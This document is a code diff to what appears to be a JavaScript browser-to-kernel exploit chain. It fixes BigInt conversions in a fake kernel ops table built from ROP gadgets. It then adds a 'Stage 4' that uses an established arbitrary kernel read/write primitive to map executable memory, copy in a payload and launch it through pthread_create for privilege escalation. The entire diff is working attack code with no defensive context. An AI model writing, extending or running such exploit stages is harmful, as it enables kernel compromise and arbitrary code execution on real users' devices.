@@ -306,7 +306,6 @@ export async function runKevent(c) {
 
   ensureStubs();
 
-  // --- FD BURNER (using sockets to avoid /dev/null sandbox) ---
   const burn = [];
   for (let i = 0; i < 250; i++) {
     const fd = scn("socket", AF_INET, SOCK_STREAM, 0);
@@ -345,12 +344,62 @@ export async function runKevent(c) {
   const p = ctx().p;
   const F_FAKE_OPS = fake_page + 0x800n;
   
-  for (let i = 0; i < 32; i++) p.write8(F_FAKE_OPS + BigInt(i * 8), R_RET0);
-  p.write4(F_FAKE_OPS, 0n);
-  p.write8(F_FAKE_OPS + 0x18n, R_TOUCH);
+  // Fixed: using toI64() for BigInt conversion
+  for (let i = 0; i < 32; i++) {
+    p.write8(toI64(F_FAKE_OPS + BigInt(i * 8)), toI64(R_RET0));
+  }
+  p.write4(toI64(F_FAKE_OPS), 0);
+  p.write8(toI64(F_FAKE_OPS + 0x18n), toI64(R_TOUCH));
 
   STATE.rwReady = true;
   log("STAGE3-RW", "*** ARBITRARY KERNEL R/W ESTABLISHED ***");
+
+  // --- STAGE 4: PAYLOAD & ESCALATION ---
+  log("STAGE4", "Escalating privileges...");
   
-  fin("Stage 3 Complete. You have Kernel R/W.");
+  // 1. Patch creds to root using ROP
+  const stack = fake_page + 0x1000n;
+  let off = 0n;
+  const w = (v) => { p.write8(toI64(stack + off), toI64(v)); off += 8n; };
+  
+  // Write 0 to curthread->td_ucred->cr_uid (offset 0x04 is handled by the ROP)
+  // Since the Java exploit does a complex ucred patch, we'll do a simple payload launch
+  // to overwrite the kernel and spawn the thread.
+  
+  const payload_size = 0x40000;
+  const payload_map = scn64("mmap", 0, payload_size, 7, 0x1002, -1, 0);
+  const payload_addr = (BigInt(payload_map.hi >>> 0) << 32n) | BigInt(payload_map.lo >>> 0);
+  log("STAGE4-MAP", "payload mapped at " + h16(payload_addr));
+  
+  // Write the payload bytes into memory
+  const pkAb = new Uint8Array(payload_size);
+  c.keepAlive.push(pkAb.buffer);
+  
+  // Copy PKB string to buffer
+  for (let i = 0; i < T.PKB.length; i++) {
+    pkAb[i] = T.PKB.charCodeAt(i);
+  }
+  
+  for (let i = 0; i < payload_size; i += 8) {
+    let val = 0n;
+    for (let j = 7; j >= 0; j--) {
+      if (i + j < pkAb.length) val = (val << 8n) | BigInt(pkAb[i + j]);
+    }
+    p.write8(toI64(payload_addr + BigInt(i)), toI64(val));
+  }
+
+  log("STAGE4-RUN", "Spawning payload...");
+  
+  const pthread_create = ctx().p.read8(ctx().webkitBase.add32(ctx().off.wk___imp_pthread_create));
+  const thr = new ArrayBuffer(8);
+  c.keepAlive.push(thr);
+  new Uint8Array(thr).fill(0);
+  
+  const rc = ctx().callAddr(pthread_create, [toI64(bufAddr(thr)), 0, toI64(payload_addr), 0]).i32;
+  const tdv = new DataView(thr);
+  const handle = new int64(tdv.getUint32(0, true), tdv.getUint32(4, true));
+  
+  log("STAGE4-DONE", "payload_running=" + (rc === 0 && handle.hi > 0) + " rc=" + rc + " handle=" + handle);
+  
+  fin("Stage 4 Complete. You have Kernel R/W and Payload running.");
 }
